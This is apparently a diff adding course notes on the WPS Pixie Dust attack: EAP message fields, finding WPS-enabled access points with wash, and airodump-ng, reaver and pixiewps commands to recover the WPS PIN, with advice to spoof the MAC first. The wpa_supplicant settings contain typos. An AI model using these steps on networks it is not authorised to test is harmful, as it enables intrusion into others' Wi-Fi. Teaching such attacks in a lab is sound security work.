@@ -40,6 +40,79 @@ E-Hash 1 - Message 3
 E-hash 2 - Message 3
 Authkey - only seen in the terminal that you ran Reaver on
 
+Overview of EAP Messages
+---------------------------
+Message 1
+  PKE
+  E-Nonce
+Message 2 
+  E-Nonce
+  PKR
+  R-Nonce (not needed for pixiewps)
+Message 3
+  R-Nonce (not needed for pixiewps)
+  E-Hash 1
+  E-Hash 2
+
+WASH Program
+----------------------------
+You can use the program "wash" to identify Access Points that have WPS enabled
+sudo apt install wash (does not work anymore, needs added to the repository)
+sudo snap install wash --edge
+
+sudo wash -i <interface>
+
+Reaver
+----------
+REAVER WILL ACCESS THE NETWORK AND EXPOSE DEVICE INFORMATION
+*Always run macchanger on the Alfa Card prior to attack process
+
+Terminal 1:
+sudo airodump-ng -c <CHANNEL>  --bssid <MAC> -w <FILENAME> <interface>
+
+Pipe this collection interface into Wireshark as well
+
+Terminal 2:
+sudo reaver -i <different interface> -b <BSSID> -c <CHANNEL> -K -S -vvv (-K is to run the Piixe after the Reaver) (-S is to use small frames) (-vvv is to be very verbose)
+DO NOT CLOSE THE REAVER TERMINAL WITHOUT COPYING THE AUTHKEY
+
+Theoretically, at this point Reaver should automatically pipe all the information into Pixiewps and crack the pin
+
+Pixiewps
+--------------
+Terminal 3:
+pixiewps -e <PKE> -r <PKR> -m <RNONCE> -n <ENONCE> -s <EHASH1> -z <EHASH2> -a <AUTHKEY> (take all the spaces out of the authkey)
+
+Must ensure that you have M1, M2, and M3
+We can pull the hashes out of each message to run pixiewps
+
+wpa_supplicant.conf
+---------------
+Terminal 4:
+First, we will edit or create a file called wpa_supplicant.conf
+Make a backup of your existing one!
+cd /etc/wpa_supplicant
+sudo vim wpa_supplicant.conf
+
+Change the document to have the following
+ctrl_interface=/var/run/spa_supplicant
+ctrl_inteface_group=0
+update_config=1
+
+WPS Commands
+-------------
+Next we will do an ifconfig to ensure we only have one wireless card up
+sudo ifconfig <interface> down
+
+Bring down your NetworkManager.service
+sudo systemctl stop NetworkManager.service
+
+not necessary and not on slides but could be useful
+(rfkill unblock wlan)
+
+
+
+
 
 
 
